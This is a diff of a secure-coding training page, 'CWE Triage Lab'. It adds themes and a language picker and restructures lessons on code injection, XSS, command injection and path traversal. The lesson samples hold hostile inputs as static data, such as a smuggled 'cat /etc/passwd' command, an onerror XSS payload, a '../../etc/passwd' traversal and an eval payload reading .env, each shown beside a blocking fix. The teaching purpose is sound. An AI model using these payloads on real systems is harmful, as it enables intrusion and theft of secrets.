@@ -5,6 +5,14 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>CWE Triage Lab</title>
 <meta name="description" content="Four injection weaknesses, one habit: trace untrusted input to the sink, then close the gap. Hands-on training for software developers.">
+<script>
+(function () {
+  var t = 'system';
+  try { t = localStorage.getItem('cwe-triage-lab:theme') || 'system'; if (t === 'arcade' && localStorage.getItem('cwe-triage-lab:arcade') !== '1') t = 'system'; } catch (e) {}
+  if (t === 'system') t = (window.matchMedia && matchMedia('(prefers-color-scheme: light)').matches) ? 'parchment' : 'candle';
+  document.documentElement.setAttribute('data-theme', t);
+})();
+</script>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600&family=Instrument+Serif:ital@0;1&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
@@ -30,8 +38,60 @@
   --mono: 'JetBrains Mono', ui-monospace, Menlo, Consolas, monospace;
   --r-sm: 4px; --r-md: 8px; --r-lg: 14px;
   --gutter: clamp(16px, 4vw, 48px);
+  --link-line: rgba(216, 169, 66, 0.4);
+  --syn-kw: #e5a35e; --syn-str: #b5c27e; --syn-num: #d6a3c9; --syn-com: #8c8170; --syn-fn: #ecd28e; --syn-type: #9fc3c4; --syn-tag: #e5a35e; --syn-anno: #d6a3c9; --syn-var: #9fc3c4;
+  --bar-bg: rgba(20, 16, 11, 0.94);
+  --drop-shadow: 0 18px 30px -12px rgba(0, 0, 0, 0.8);
   color-scheme: dark;
 }
+/* ---------- themes (set on <html data-theme>) ---------- */
+[data-theme="parchment"] {
+  --syn-kw: #9a4a12; --syn-str: #4a6614; --syn-num: #8a3a7a; --syn-com: #6b5f4d; --syn-fn: #6b4e00; --syn-type: #1f6670; --syn-tag: #9a4a12; --syn-anno: #8a3a7a; --syn-var: #1f6670;
+  --bg: #f6f0e4; --panel: #fbf7ef; --panel-2: #efe6d4; --line: #e0d4bd; --line-strong: #c4ae86;
+  --cream: #241a10; --text: #3d3123; --muted: #6b5f4d;
+  --gold: #8a6512; --gold-hover: #6f500d; --gold-wash: rgba(138, 101, 18, 0.12);
+  --ok: #3d6a1e; --ok-wash: rgba(61, 106, 30, 0.10); --bad: #a63e29; --bad-wash: rgba(166, 62, 41, 0.08);
+  --link-line: rgba(138, 101, 18, 0.4); --bar-bg: rgba(251, 247, 239, 0.94); --drop-shadow: 0 18px 30px -16px rgba(60, 40, 10, 0.28);
+  color-scheme: light;
+}
+[data-theme="midnight"] {
+  --syn-kw: #c49bff; --syn-str: #9fd49b; --syn-num: #f7b98a; --syn-com: #8794a8; --syn-fn: #8cc4ff; --syn-type: #7fd6d2; --syn-tag: #c49bff; --syn-anno: #f7b98a; --syn-var: #7fd6d2;
+  --bg: #0b0f17; --panel: #111723; --panel-2: #182031; --line: #222c3f; --line-strong: #3a4968;
+  --cream: #e6ecf5; --text: #c3cddc; --muted: #8794a8;
+  --gold: #7fb4ff; --gold-hover: #a3c9ff; --gold-wash: rgba(127, 180, 255, 0.14);
+  --ok: #8fd18b; --ok-wash: rgba(143, 209, 139, 0.10); --bad: #ff9a8a; --bad-wash: rgba(255, 154, 138, 0.10);
+  --link-line: rgba(127, 180, 255, 0.4); --bar-bg: rgba(17, 23, 35, 0.94);
+}
+[data-theme="phosphor"] {
+  --syn-kw: #ffcf4a; --syn-str: #b6ffc7; --syn-num: #ffa86b; --syn-com: #64a374; --syn-fn: #e6ffeb; --syn-type: #7dffd9; --syn-tag: #ffcf4a; --syn-anno: #ffa86b; --syn-var: #7dffd9;
+  --bg: #050a06; --panel: #08110a; --panel-2: #0e1a10; --line: #173020; --line-strong: #2b5a3b;
+  --cream: #c8ffd4; --text: #8fe0a2; --muted: #64a374;
+  --gold: #ffcf4a; --gold-hover: #ffdb73; --gold-wash: rgba(255, 207, 74, 0.12);
+  --ok: #7dff9e; --ok-wash: rgba(125, 255, 158, 0.10); --bad: #ff7a6b; --bad-wash: rgba(255, 122, 107, 0.10);
+  --link-line: rgba(255, 207, 74, 0.4); --bar-bg: rgba(8, 17, 10, 0.94);
+  --serif: 'JetBrains Mono', ui-monospace, monospace; --sans: 'JetBrains Mono', ui-monospace, monospace;
+}
+[data-theme="phosphor"] body { text-shadow: 0 0 6px rgba(125, 255, 158, 0.18); }
+[data-theme="phosphor"] .hero h1, [data-theme="phosphor"] .mhead h2 { letter-spacing: -0.04em; }
+[data-theme="contrast"] {
+  --syn-kw: #ffd400; --syn-str: #8dff9f; --syn-num: #ff9be0; --syn-com: #d6d6d6; --syn-fn: #ffffff; --syn-type: #7fe9ff; --syn-tag: #ffd400; --syn-anno: #ff9be0; --syn-var: #7fe9ff;
+  --bg: #000000; --panel: #0a0a0a; --panel-2: #1c1c1c; --line: #6a6a6a; --line-strong: #a8a8a8;
+  --cream: #ffffff; --text: #ffffff; --muted: #d6d6d6;
+  --gold: #ffd400; --gold-hover: #ffe24d; --gold-wash: rgba(255, 212, 0, 0.22);
+  --ok: #5dff8a; --ok-wash: rgba(93, 255, 138, 0.16); --bad: #ff7070; --bad-wash: rgba(255, 112, 112, 0.16);
+  --link-line: #ffd400; --bar-bg: #000000;
+}
+[data-theme="contrast"] .snip.dim { opacity: 1; }
+[data-theme="arcade"] {
+  --syn-kw: #ff6bbb; --syn-str: #2de2e6; --syn-num: #ffb443; --syn-com: #a996d6; --syn-fn: #fdf6ff; --syn-type: #b48cff; --syn-tag: #ff6bbb; --syn-anno: #ffb443; --syn-var: #b48cff;
+  --bg: #0d0221; --panel: #160736; --panel-2: #22104d; --line: #3a1f78; --line-strong: #6a40c2;
+  --cream: #fdf6ff; --text: #e0d4ff; --muted: #a996d6;
+  --gold: #ff3ea5; --gold-hover: #ff6bbb; --gold-wash: rgba(255, 62, 165, 0.16);
+  --ok: #2de2e6; --ok-wash: rgba(45, 226, 230, 0.12); --bad: #ffb443; --bad-wash: rgba(255, 180, 67, 0.12);
+  --link-line: rgba(255, 62, 165, 0.5); --bar-bg: rgba(22, 7, 54, 0.94);
+}
+[data-theme="arcade"] .hero h1 em, [data-theme="arcade"] .brand span { text-shadow: 0 0 18px rgba(255, 62, 165, 0.55); }
+[data-theme="arcade"] .mnum { -webkit-text-stroke-color: var(--gold); opacity: .55; }
 *, *::before, *::after { box-sizing: border-box; }
 .view[hidden] { display: none; }
 .view { animation: viewIn .35s ease both; }
@@ -45,9 +105,9 @@
 .pager b { font: 400 26px/1.1 var(--serif); }
 .pager a:hover b { color: var(--gold); }
 .brand-home { display: block; }
-body { margin: 0; background: var(--bg); color: var(--text); font: 400 16px/1.65 var(--sans); -webkit-font-smoothing: antialiased; overflow-x: hidden; }
+body { margin: 0; background: var(--bg); transition: background-color .3s ease, color .3s ease; color: var(--text); font: 400 16px/1.65 var(--sans); -webkit-font-smoothing: antialiased; overflow-x: hidden; }
 ::selection { background: var(--gold); color: var(--bg); }
-a { color: var(--gold); text-underline-offset: 3px; text-decoration-color: rgba(216,169,66,.4); }
+a { color: var(--gold); text-underline-offset: 3px; text-decoration-color: var(--link-line); }
 a:hover { text-decoration-color: var(--gold); }
 :focus-visible { outline: 2px solid var(--gold); outline-offset: 3px; border-radius: 2px; }
 code, pre { font-family: var(--mono); font-variant-ligatures: none; }
@@ -60,7 +120,7 @@ code, pre { font-family: var(--mono); font-variant-ligatures: none; }
 body { display: grid; grid-template-columns: 264px minmax(0, 1fr); min-height: 100vh; }
 .content { min-width: 0; }
 .sidebar { position: sticky; top: 0; height: 100vh; overflow-y: auto; background: var(--panel); border-right: 1px solid var(--line); padding: 28px 16px 24px; display: flex; flex-direction: column; gap: 28px; z-index: 10; }
-.brand { font: italic 400 26px/1 var(--serif); color: var(--cream); text-decoration: none; white-space: nowrap; padding: 0 12px; }
+.brand { font: italic 400 24px/1 var(--serif); color: var(--cream); text-decoration: none; white-space: nowrap; padding: 0 0 0 12px; }
 .brand span { color: var(--gold); }
 .side-label { padding: 0 12px; margin-bottom: 10px; display: block; }
 .sidebar nav { display: flex; flex-direction: column; gap: 2px; }
@@ -118,10 +178,10 @@ body { display: grid; grid-template-columns: 264px minmax(0, 1fr); min-height: 1
 
 .pair { display: grid; grid-template-columns: repeat(2, minmax(0,1fr)); gap: 16px; margin: 48px 0 0; }
 .snip { margin: 0; border: 1px solid var(--line); border-radius: var(--r-md); background: var(--panel); overflow: hidden; min-width: 0; transition: border-color .25s ease, opacity .25s ease; }
-.snip figcaption { display: flex; justify-content: space-between; align-items: center; padding: 10px 14px; border-bottom: 1px solid var(--line); font: 500 12px/1 var(--mono); letter-spacing: .1em; text-transform: uppercase; }
+.snip figcaption { display: flex; flex-wrap: wrap; gap: 4px 12px; justify-content: space-between; align-items: baseline; padding: 10px 14px; border-bottom: 1px solid var(--line); font: 500 12px/1 var(--mono); letter-spacing: .1em; text-transform: uppercase; }
 .snip.unsafe figcaption { color: var(--bad); }
 .snip.fixed figcaption { color: var(--ok); }
-.snip figcaption small { color: var(--muted); letter-spacing: .04em; text-transform: none; font-weight: 400; }
+.snip figcaption small { color: var(--muted); overflow-wrap: anywhere; letter-spacing: .04em; text-transform: none; font-weight: 400; }
 .snip pre { margin: 0; padding: 14px; font-size: 13px; line-height: 1.7; color: var(--text); white-space: pre-wrap; overflow-wrap: anywhere; }
 .ln { display: block; padding: 0 8px; margin: 0 -8px; border-radius: 3px; }
 .ln.hot { background: var(--gold-wash); box-shadow: inset 2px 0 0 var(--gold); color: var(--cream); }
@@ -198,6 +258,70 @@ fieldset.q legend span { display: block; font: 500 11px/1 var(--mono); letter-sp
 .refs { margin: 32px 0 0; display: flex; flex-wrap: wrap; gap: 8px 20px; font-size: 13px; }
 .refs .eyebrow { width: 100%; margin-bottom: 4px; }
 
+/* language picker */
+.stack-select { appearance: none; -webkit-appearance: none; font: 500 13.5px/1.2 var(--mono); color: var(--cream); background: linear-gradient(45deg, transparent 50%, var(--gold) 50%) right 19px center / 5px 5px no-repeat, linear-gradient(-45deg, transparent 50%, var(--gold) 50%) right 14px center / 5px 5px no-repeat, var(--bg); border: 1px solid var(--line-strong); border-radius: 999px; min-height: 40px; padding: 0 36px 0 14px; cursor: pointer; max-width: 100%; text-transform: none; letter-spacing: 0; }
+.stack-select:hover { border-color: var(--gold); }
+.stack-select:focus-visible { outline: 2px solid var(--gold); outline-offset: 3px; }
+.stack-select option, .stack-select optgroup { background: var(--panel); color: var(--cream); }
+.side-stack { margin: 0 0 24px; padding: 0 4px; }
+.side-stack .side-label { padding: 0 8px; }
+.side-stack .stack-select { width: 100%; }
+.hero-stack { margin: 36px 0 0; display: flex; flex-wrap: wrap; align-items: center; gap: 12px 16px; }
+.hero-stack .stack-select { width: min(340px, 100%); min-width: 0; }
+.stackbar { margin: 48px 0 0; padding: 16px 0 0; border-top: 1px solid var(--line); display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; gap: 12px 24px; }
+.stackbar label { display: flex; align-items: center; gap: 12px; flex: 1 1 100%; min-width: 0; }
+.stackbar label.eyebrow { white-space: nowrap; }
+.stackbar .stack-select { flex: 0 1 340px; min-width: 0; width: 340px; }
+.stack-note { margin: 0; font-size: 14px; color: var(--muted); max-width: 60ch; }
+.lesson .story { margin-top: 32px; }
+.drill-lang { margin: 8px 0 0; font-size: 13px; color: var(--muted); }
+
+/* theme picker */
+.side-theme { margin: 0 0 24px; padding: 0 4px; }
+.side-theme .side-label { padding: 0 8px; }
+.swatches { display: flex; flex-wrap: wrap; gap: 8px; padding: 0 8px; }
+.sw { width: 34px; height: 34px; border-radius: 50%; border: 1px solid var(--line-strong); padding: 3px; cursor: pointer; background: var(--bg); display: grid; place-items: center; }
+.sw i { display: block; width: 100%; height: 100%; border-radius: 50%; }
+.sw[aria-checked="true"] { border: 2px solid var(--gold); padding: 2px; }
+.sw:focus-visible { outline: 2px solid var(--gold); outline-offset: 2px; }
+.theme-name { display: block; padding: 8px 8px 0; font: 400 12px/1.4 var(--mono); color: var(--muted); }
+.sw.secret { animation: pop .5s ease both; }
+@keyframes pop { 0% { transform: scale(.2); } 70% { transform: scale(1.15); } 100% { transform: scale(1); } }
+
+/* easter egg */
+.egg { position: fixed; inset: 0; z-index: 50; pointer-events: none; overflow: hidden; }
+.egg span { position: absolute; top: -40px; font: 500 13px/1 var(--mono); color: var(--bad); background: var(--panel); border: 1px solid var(--bad); border-radius: 999px; padding: 6px 10px; white-space: nowrap; animation: fall var(--d, 2.4s) cubic-bezier(.4, 0, .9, .6) var(--delay, 0s) forwards; }
+.egg span.caught { color: var(--ok); border-color: var(--ok); }
+.egg .shield { position: absolute; left: 0; right: 0; top: 68%; height: 3px; background: var(--ok); box-shadow: 0 0 24px var(--ok); opacity: 0; animation: shield 3.6s ease forwards; }
+@keyframes fall { 0% { transform: translateY(0); opacity: 1; } 100% { transform: translateY(68vh); opacity: 1; } }
+@keyframes shield { 0%, 8% { opacity: 0; } 15%, 80% { opacity: .9; } 100% { opacity: 0; } }
+.toast { position: fixed; left: 50%; bottom: 24px; transform: translateX(-50%); z-index: 60; max-width: min(520px, calc(100vw - 32px)); background: var(--panel); border: 1px solid var(--gold); border-radius: var(--r-lg); padding: 16px 18px; box-shadow: var(--drop-shadow); display: grid; gap: 10px; animation: viewIn .35s ease both; }
+.toast b { font: italic 400 24px/1.1 var(--serif); color: var(--gold); }
+.toast p { margin: 0; font-size: 14px; color: var(--text); }
+.toast .btns { margin: 0; }
+
+/* syntax colors */
+.tk-k { color: var(--syn-kw); }
+.tk-s { color: var(--syn-str); }
+.tk-n { color: var(--syn-num); }
+.tk-c { color: var(--syn-com); font-style: italic; }
+.tk-f { color: var(--syn-fn); }
+.tk-y { color: var(--syn-type); }
+.tk-t { color: var(--syn-tag); }
+.tk-a { color: var(--syn-anno); }
+.tk-v { color: var(--syn-var); }
+.snip.unsafe .ln.hot, .snip.fixed .ln.hot { text-shadow: none; }
+
+/* settings gear + popover */
+.side-head { position: relative; display: flex; align-items: center; justify-content: space-between; gap: 8px; }
+.gear { flex: none; width: 36px; height: 36px; display: grid; place-items: center; border-radius: 50%; border: 1px solid transparent; background: transparent; color: var(--muted); cursor: pointer; transition: color .15s ease, border-color .15s ease, transform .4s ease; }
+.gear:hover { color: var(--cream); border-color: var(--line-strong); }
+.gear[aria-expanded="true"] { color: var(--gold); border-color: var(--gold); transform: rotate(60deg); }
+.gear:focus-visible { outline: 2px solid var(--gold); outline-offset: 2px; }
+.settings { position: absolute; top: calc(100% + 10px); left: 0; right: 0; z-index: 30; background: var(--panel); border: 1px solid var(--line-strong); border-radius: var(--r-lg); padding: 14px 8px 12px; box-shadow: var(--drop-shadow); animation: viewIn .2s ease both; }
+.settings[hidden] { display: none; }
+.settings .side-label { margin-bottom: 10px; }
+
 /* footer */
 footer { padding: 48px 0 64px; color: var(--muted); font-size: 13px; }
 footer .wrap { display: flex; flex-wrap: wrap; gap: 16px 32px; justify-content: space-between; align-items: center; }
@@ -206,11 +330,13 @@ footer p { margin: 0; max-width: 64ch; }
 
 @media (max-width: 900px) {
   body { display: block; }
-  .sidebar { height: auto; overflow: visible; flex-direction: row; align-items: center; justify-content: space-between; gap: 12px; padding: 0 16px; min-height: 56px; border-right: 0; border-bottom: 1px solid var(--line); background: rgba(20,16,11,.94); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); }
+  .sidebar { height: auto; overflow: visible; flex-direction: row; align-items: center; justify-content: space-between; gap: 12px; padding: 0 16px; min-height: 56px; border-right: 0; border-bottom: 1px solid var(--line); background: var(--bar-bg); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); }
   .brand { font-size: 21px; padding: 0; }
+  .side-head { position: static; flex: 1 1 auto; min-width: 0; justify-content: flex-start; gap: 4px; }
+  .settings { top: 100%; left: auto; right: 8px; width: min(300px, calc(100vw - 16px)); margin-top: 8px; }
   .menu { display: inline-flex; align-items: center; gap: 8px; min-height: 40px; padding: 0 14px; border-radius: 999px; border: 1px solid var(--line-strong); background: transparent; color: var(--cream); font: 500 13px/1 var(--mono); cursor: pointer; }
   .menu[aria-expanded="true"] { border-color: var(--gold); background: var(--panel-2); }
-  .side-mods { display: none; position: absolute; left: 0; right: 0; top: 100%; background: var(--panel); border-bottom: 1px solid var(--line); padding: 12px 8px 16px; box-shadow: 0 18px 30px -12px rgba(0,0,0,.8); }
+  .side-mods { display: none; position: absolute; left: 0; right: 0; top: 100%; background: var(--panel); border-bottom: 1px solid var(--line); padding: 12px 8px 16px; box-shadow: var(--drop-shadow); }
   .side-mods.open { display: block; }
   .side-foot { display: none; }
 }
@@ -237,6 +363,7 @@ footer p { margin: 0; max-width: 64ch; }
   html { scroll-behavior: auto; }
   *, *::before, *::after { transition: none !important; animation: none !important; }
   .view { animation: none; }
+  .egg { display: none; }
   .rail li { transform: none; }
 }
 </style>
@@ -245,9 +372,20 @@ footer p { margin: 0; max-width: 64ch; }
 <a class="skip" href="#main">Skip to content</a>
 
 <aside class="sidebar">
-  <a class="brand" href="#home">CWE <span>Triage</span> Lab</a>
+  <div class="side-head">
+    <a class="brand" href="#home">CWE <span>Triage</span> Lab</a>
+    <button class="gear" type="button" id="gear" aria-expanded="false" aria-controls="settings" aria-label="Settings">
+      <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 1 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 1 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 1 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 1 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
+    </button>
+    <div class="settings" id="settings" role="dialog" aria-label="Settings" hidden>
+      <span class="eyebrow side-label" id="themeLabel">Theme</span>
+      <div class="swatches" id="swatches" role="radiogroup" aria-labelledby="themeLabel"></div>
+      <span class="theme-name" id="themeName" aria-live="polite"></span>
+    </div>
+  </div>
   <button class="menu" type="button" aria-expanded="false" aria-controls="sideMods" id="menu">CWEs <span aria-hidden="true">▾</span></button>
   <div class="side-mods" id="sideMods">
+    <div class="side-stack" id="sideStack"><label class="eyebrow side-label" for="stackSide">Language</label></div>
     <span class="eyebrow side-label">Weaknesses</span>
     <nav aria-label="CWE modules" id="nav"></nav>
   </div>
@@ -264,6 +402,7 @@ footer p { margin: 0; max-width: 64ch; }
       <span class="eyebrow">Secure code training · 4 modules · ~20 min</span>
       <h1>Follow the input. <em>Find the sink.</em></h1>
       <p class="lede">Four of the most common injection weaknesses, taught with one habit: trace where untrusted text enters, where it gets interpreted, and which check is missing in between. Every example is static text. Nothing on this page runs an exploit.</p>
+      <div class="hero-stack" id="heroStack"><label class="eyebrow" for="stackHero">Show code in</label></div>
       <div class="flow" aria-label="The triage pattern">
         <div class="node"><b>Source</b><span>Text a user controls</span></div>
         <div class="arrow" aria-hidden="true"></div>
@@ -295,19 +434,6 @@ footer p { margin: 0; max-width: 64ch; }
       id: 'm94', cwe: 'CWE-94', num: '94', short: 'Code', title: 'Code injection',
       intro: 'Request data turns into text the application compiles or evaluates as its own code.',
       lesson: 'Never run user text as code. Check its shape, then call a fixed function you wrote.',
-      problem: 'A calculator page reads a sum such as "2 + 3" from the web address and passes it to eval() to get the answer.',
-      why: 'The input is the expr text; the sink is eval(). Anyone can put real JavaScript in the address, and the server runs it with its own access.',
-      works: 'The fix never runs the text. It checks for "number, + or *, number", answers 400 to anything else, then calls a function the developer wrote.',
-      unsafe: { code: 'const expr = req.query.expr;   // "2 + 3"\nres.send(String(eval(expr)));', hot: 1 },
-      fixed: { code: "const m = /^(\\d+) ([+*]) (\\d+)$/.exec(req.query.expr);\nif (!m) return res.sendStatus(400);\nconst OPS = { '+': (a, b) => a + b, '*': (a, b) => a * b };\nres.send(String(OPS[m[2]](Number(m[1]), Number(m[3]))));", hot: 1 },
-      samples: [
-        { kind: 'Ordinary', input: '2 + 3',
-          unsafe: { op: 'eval runs the text as JavaScript', out: '5', effect: 'ok' },
-          fixed: { op: 'Matches "number op number"; calls OPS["+"]', out: '5', effect: 'ok' } },
-        { kind: 'Harmful', input: "require('fs').readFileSync('.env')",
-          unsafe: { op: 'eval runs the text as JavaScript', out: 'Server secrets from .env sent back', effect: 'harm' },
-          fixed: { op: 'Does not match "number op number"', out: '400 Bad Request: nothing ran', effect: 'blocked' } }
-      ],
       drill: {
         title: 'Promo rule preview',
         scenario: 'Store managers type a discount rule and preview the rate for their current cart.',
@@ -333,19 +459,6 @@ footer p { margin: 0; max-width: 64ch; }
       id: 'm79', cwe: 'CWE-79', num: '79', short: 'XSS', title: 'Cross-site scripting',
       intro: 'Untrusted text lands in a page as markup, so a script runs as the visitor on your site.',
       lesson: 'Put user text into the page as text, not HTML.',
-      problem: 'A welcome banner reads a name from the web address, such as ?name=Ana, and shows "Hi Ana".',
-      why: 'The input is the name; the sink is innerHTML, which parses its value as HTML. A link with a tag in the name makes the browser build that tag and run its script.',
-      works: 'textContent puts the name on the page as plain text. The browser never parses it, so a tag shows up as ordinary characters.',
-      unsafe: { code: "const name = params.get('name');\nhello.innerHTML = 'Hi ' + name;", hot: 1 },
-      fixed: { code: "const name = params.get('name');\nhello.textContent = 'Hi ' + name;", hot: 1 },
-      samples: [
-        { kind: 'Ordinary', input: 'Ana',
-          unsafe: { op: 'innerHTML parses the string as HTML', out: 'Hi Ana', effect: 'ok' },
-          fixed: { op: 'textContent makes one text node', out: 'Hi Ana', effect: 'ok' } },
-        { kind: 'Harmful', input: '<img src=x onerror=alert(1)>',
-          unsafe: { op: 'innerHTML parses the string as HTML', out: 'Browser builds an <img>; its onerror script runs', effect: 'harm' },
-          fixed: { op: 'textContent makes one text node', out: 'Hi <img src=x onerror=alert(1)> shown as plain text', effect: 'blocked' } }
-      ],
       drill: {
         title: 'Search results page',
         scenario: 'The catalog search echoes the search term back in the server-rendered page.',
@@ -371,22 +484,6 @@ footer p { margin: 0; max-width: 64ch; }
       id: 'm78', cwe: 'CWE-78', num: '78', short: 'Commands', title: 'OS command injection',
       intro: 'Untrusted text reaches a shell and adds commands, or reaches a program and adds options.',
       lesson: 'Skip the shell, and accept only the values you expect.',
-      problem: 'A support page checks whether a server is up by running ping. The server name comes from the web address and is glued onto a command line.',
-      why: 'The input is host; the sink is exec(), which hands the whole line to a shell. To a shell ";" means "run another command". Text starting with "-" can become ping options.',
-      works: 'The fix accepts only names on its own list and answers 400 otherwise. execFile() starts ping directly, with no shell, passing the name as one argument.',
-      unsafe: { code: "const host = req.query.host;   // \"web-1\"\nexec('ping -c 1 ' + host);", hot: 1 },
-      fixed: { code: "const HOSTS = new Set(['web-1', 'web-2']);\nconst host = req.query.host;\nif (!HOSTS.has(host)) return res.sendStatus(400);\nexecFile('ping', ['-c', '1', host]);   // no shell", hot: 2 },
-      samples: [
-        { kind: 'Ordinary', input: 'web-1',
-          unsafe: { op: 'Shell runs: ping -c 1 web-1', out: '1 packet received from web-1', effect: 'ok' },
-          fixed: { op: 'web-1 is on the list; passed as one argument', out: '1 packet received from web-1', effect: 'ok' } },
-        { kind: 'Harmful', input: 'web-1; cat /etc/passwd',
-          unsafe: { op: 'Shell splits at ";" and runs a second command', out: 'cat /etc/passwd also runs as the app user', effect: 'harm' },
-          fixed: { op: 'Not on the list', out: '400 Bad Request: no command ran', effect: 'blocked' } },
-        { kind: 'Harmful', input: '-f web-1',
-          unsafe: { op: 'ping reads -f as an option, not a hostname', out: 'Attacker changes ping options', effect: 'harm' },
-          fixed: { op: 'Not on the list; options never reach ping', out: '400 Bad Request: no command ran', effect: 'blocked' } }
-      ],
       drill: {
         title: 'Hostname lookup tool',
         scenario: 'Support staff paste a customer hostname to check that it resolves.',
@@ -412,19 +509,6 @@ footer p { margin: 0; max-width: 64ch; }
       id: 'm22', cwe: 'CWE-22', num: '22', short: 'Paths', title: 'Path traversal',
       intro: 'A user-influenced name becomes a file path and climbs out of the folder it was meant for.',
       lesson: 'Do not build file paths from user text. Look the name up in a list the server controls.',
-      problem: 'A download page sends a file by name, such as ?name=report.pdf, from the folder /srv/files.',
-      why: 'The input is the name; the sink is the path that path.join() builds and sendFile() opens. Each "../" goes up one folder, so a name can reach any file the server can read.',
-      works: 'The fix never builds a path from user text. It looks the name up in a server-written map; unknown names get 404, and the path comes only from the server’s entry.',
-      unsafe: { code: "const file = path.join('/srv/files', req.query.name);\nres.sendFile(file);", hot: 0 },
-      fixed: { code: "const FILES = new Map([['report.pdf', 'a91f.pdf']]);   // set by the server\nconst stored = FILES.get(req.query.name);\nif (!stored) return res.sendStatus(404);\nres.sendFile(path.join('/srv/files', stored));", hot: 1 },
-      samples: [
-        { kind: 'Ordinary', input: 'report.pdf',
-          unsafe: { op: 'Path becomes /srv/files/report.pdf', out: 'report.pdf downloaded', effect: 'ok' },
-          fixed: { op: 'Map has report.pdf → a91f.pdf', out: 'report.pdf downloaded', effect: 'ok' } },
-        { kind: 'Harmful', input: '../../etc/passwd',
-          unsafe: { op: 'Each ../ climbs up: path becomes /etc/passwd', out: 'The server’s /etc/passwd downloaded', effect: 'harm' },
-          fixed: { op: 'No such key; no path is built', out: '404 Not Found', effect: 'blocked' } }
-      ],
       drill: {
         title: 'Invoice download',
         scenario: 'Customers download invoice PDFs by name. The framework already percent-decodes query values once.',
@@ -448,6 +532,373 @@ footer p { margin: 0; max-width: 64ch; }
     }
   ];
 
+  /* ---------- lessons: stack-neutral text; {sink}, {guard}, {payload} come from the chosen stack ---------- */
+  const LESSONS = {
+    m94: {
+      problem: 'A calculator page reads a sum such as "2 + 3" from the web address and hands it to {sink} to work out the answer.',
+      why: 'The input is the expr text; the sink is {sink}, which runs whatever code it is given. Anyone can put real code in the address instead of a sum, and the server runs it with its own access.',
+      works: 'The fix never runs the text. It checks for "number, + or *, number" with {guard}, answers 400 to anything else, then does the arithmetic itself.',
+      samples: [
+        { kind: 'Ordinary', input: '2 + 3',
+          unsafe: { op: '{sink} runs the text as code', out: '5', effect: 'ok' },
+          fixed: { op: 'Matches "number op number"; adds the numbers', out: '5', effect: 'ok' } },
+        { kind: 'Harmful', input: '{payload}',
+          unsafe: { op: '{sink} runs the text as code', out: 'Attacker code runs with the server’s access: .env secrets sent back', effect: 'harm' },
+          fixed: { op: 'Does not match "number op number"', out: '400 Bad Request: nothing ran', effect: 'blocked' } }
+      ]
+    },
+    m79: {
+      problem: 'A welcome banner reads a name from the web address, such as ?name=Ana, and shows "Hi Ana".',
+      why: 'The input is the name; the sink is {sink}, which puts it into the page as raw HTML. A link with a tag in the name makes the browser build that tag, and a script in it runs as the visitor on this site.',
+      works: 'The fix uses {guard}, which puts the name on the page as text. A tag shows up as ordinary characters and nothing runs.',
+      samples: [
+        { kind: 'Ordinary', input: 'Ana',
+          unsafe: { op: '{sink} outputs the string as HTML', out: 'Hi Ana', effect: 'ok' },
+          fixed: { op: '{guard} outputs it as text', out: 'Hi Ana', effect: 'ok' } },
+        { kind: 'Harmful', input: '<img src=x onerror=alert(1)>',
+          unsafe: { op: '{sink} outputs the string as HTML', out: 'Browser builds an <img>; its onerror script runs', effect: 'harm' },
+          fixed: { op: '{guard} outputs it as text', out: 'Hi <img src=x onerror=alert(1)> shown as plain text', effect: 'blocked' } }
+      ]
+    },
+    m78: {
+      problem: 'A support page checks whether a server is up by running ping. The server name, such as web-1, comes from the web address and is glued onto a command line.',
+      why: 'The input is host; the sink is {sink}, which hands the whole line to a shell. To a shell ";" means "now run another command", so extra text becomes extra commands. Text starting with "-" can also turn into ping options.',
+      works: 'The fix accepts only names on its own list and answers 400 otherwise. Then {guard} starts ping directly, with no shell, passing the name as one argument, so nothing in it can start another command.',
+      samples: [
+        { kind: 'Ordinary', input: 'web-1',
+          unsafe: { op: 'Shell runs: ping -c 1 web-1', out: '1 packet received from web-1', effect: 'ok' },
+          fixed: { op: 'web-1 is on the list; passed to ping as one argument', out: '1 packet received from web-1', effect: 'ok' } },
+        { kind: 'Harmful', input: 'web-1; cat /etc/passwd',
+          unsafe: { op: 'Shell splits at ";" and runs a second command', out: 'cat /etc/passwd also runs as the app user', effect: 'harm' },
+          fixed: { op: 'Not on the list', out: '400 Bad Request: no command ran', effect: 'blocked' } },
+        { kind: 'Harmful', input: '-f web-1',
+          unsafe: { op: 'ping reads -f as an option, not a hostname', out: 'Attacker changes ping options', effect: 'harm' },
+          fixed: { op: 'Not on the list; options never reach ping', out: '400 Bad Request: no command ran', effect: 'blocked' } }
+      ]
+    },
+    m22: {
+      problem: 'A download page sends a file by name, such as ?name=report.pdf, from the folder /srv/files.',
+      why: 'The input is the name; the sink is {sink}, which opens whatever path it is given. Each "../" in a path means "go up one folder", so a name can climb out of /srv/files and download any file the server can read.',
+      works: 'The fix never builds a path from user text. It looks the name up in {guard}. A name that is not there gets 404, and the path comes only from the server’s own entry.',
+      samples: [
